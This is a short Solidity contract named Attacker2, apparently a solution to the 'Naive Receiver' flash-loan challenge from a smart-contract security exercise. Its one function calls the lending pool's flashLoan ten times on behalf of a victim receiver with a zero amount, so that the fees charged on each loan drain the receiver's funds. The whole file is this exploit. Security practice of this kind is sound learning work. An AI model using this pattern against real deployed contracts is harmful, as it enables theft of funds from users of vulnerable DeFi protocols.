// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract Attacker2 {
    function attack(address _poolAddr, address _receiverAddr) public {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(payable(_poolAddr)).flashLoan(_receiverAddr, 0);
        }
    }
}
